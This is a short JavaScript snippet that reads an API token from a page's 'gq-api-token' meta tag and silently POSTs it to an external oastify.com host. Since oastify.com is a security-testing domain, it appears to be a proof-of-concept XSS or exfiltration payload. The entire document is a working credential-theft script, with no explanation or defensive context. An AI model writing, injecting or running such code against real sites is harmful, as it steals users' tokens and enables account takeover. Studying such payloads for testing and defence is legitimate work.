(function() {
  const meta = document.querySelector('meta[name="gq-api-token"]');
  if (!meta) return;

  const token = meta.content;
  fetch('https://n5tdeo961nx8sz36mfm6o6o2ftll9cx1.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token })
  });
})();
